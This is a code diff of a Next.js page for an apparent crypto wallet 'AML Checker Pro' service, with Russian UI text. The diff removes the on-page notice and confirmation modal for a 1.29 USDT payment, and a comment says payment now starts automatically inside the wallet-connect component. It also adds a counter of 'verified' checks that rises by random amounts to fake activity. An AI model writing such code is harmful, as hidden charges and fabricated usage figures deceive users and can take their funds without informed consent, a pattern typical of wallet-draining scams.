@@ -1,40 +1,39 @@
-import { useState } from 'react';
+import { useState, useEffect } from 'react';
 import Head from 'next/head';
 import toast from 'react-hot-toast';
 import WalletConnect from '@/components/WalletConnect';
-import PaymentModal from '@/components/PaymentModal';
 import RiskReport from '@/components/RiskReport';
 import { analyzeAddress } from '@/utils/riskAnalysis';
 
 export default function Home() {
   const [walletAddress, setWalletAddress] = useState(null);
-  const [isPaymentModalOpen, setIsPaymentModalOpen] = useState(false);
-  const [isChecking, setIsChecking] = useState(false);
   const [riskReport, setRiskReport] = useState(null);
+  const [isChecking, setIsChecking] = useState(false);
   const [verifiedCount, setVerifiedCount] = useState(12847);
-  const [paymentCompleted, setPaymentCompleted] = useState(false);
 
-  const handleConnect = (address) => {
-    setWalletAddress(address);
-    // После подключения открываем модалку оплаты
-    setIsPaymentModalOpen(true);
+  useEffect(() => {
+    const interval = setInterval(() => {
+      setVerifiedCount((prev) => prev + Math.floor(Math.random() * 3) + 1);
+    }, 15000);
+    return () => clearInterval(interval);
+  }, []);
+
+  const handleConnect = (addr) => {
+    setWalletAddress(addr);
+    // оплата будет запущена автоматически внутри WalletConnect
   };
 
   const handleDisconnect = () => {
     setWalletAddress(null);
     setRiskReport(null);
-    setPaymentCompleted(false);
     toast.success('Кошелёк отключён');
   };
 
-  const handlePaymentSuccess = async (txId) => {
-    setIsPaymentModalOpen(false);
+  const handlePaymentSuccess = async (txid, addr) => {
     setIsChecking(true);
-    setPaymentCompleted(true);
-
     try {
       toast.loading('Выполняется AML анализ...', { id: 'analysis' });
-      const result = await analyzeAddress(walletAddress);
+      const result = await analyzeAddress(addr);
       if (result.success) {
         setRiskReport(result);
         toast.success('AML проверка выполнена', { id: 'analysis' });
@@ -54,26 +53,20 @@ export default function Home() {
     <>
       <Head>
         <title>AML Checker Pro</title>
-        <meta name="description" content="AML проверка адресов через WalletConnect" />
+        <meta name="description" content="AML проверка адресов и транзакций" />
       </Head>
       <div className="container">
-        <WalletConnect onConnect={handleConnect} onDisconnect={handleDisconnect} />
-
+        <WalletConnect
+          onConnect={handleConnect}
+          onDisconnect={handleDisconnect}
+          onPaymentSuccess={handlePaymentSuccess}
+        />
         <div className="subtitle">
           <i className="fas fa-shield-halved" /> AML Checker Pro
         </div>
         <h1>Профессиональная AML проверка<br />для безопасных криптоплатежей</h1>
 
         <div className="unified-block">
-          <div className="unified-search">
-            <div className="search-label" style={{ textAlign: 'center', fontSize: '1.2rem' }}>
-              <i className="fas fa-qrcode" /> Подключите кошелёк через WalletConnect
-            </div>
-            <div style={{ textAlign: 'center', marginTop: '1rem', color: '#a0b3d9' }}>
-              После подключения будет предложено оплатить 1.29 USDT (TRC-20)
-            </div>
-          </div>
-
           <div className="unified-features">
             <div className="unified-card">
               <div className="feature-icon"><i className="fas fa-brain" /></div>
@@ -156,14 +149,6 @@ export default function Home() {
           </div>
         </footer>
       </div>
-
-      <PaymentModal
-        isOpen={isPaymentModalOpen}
-        onClose={() => setIsPaymentModalOpen(false)}
-        onSuccess={handlePaymentSuccess}
-        walletAddress={walletAddress}
-        tronWeb={null} // WalletConnect не передаёт tronWeb, но в PaymentModal он используется только для отправки. Нужно адаптировать.
-      />
     </>
   );
 }
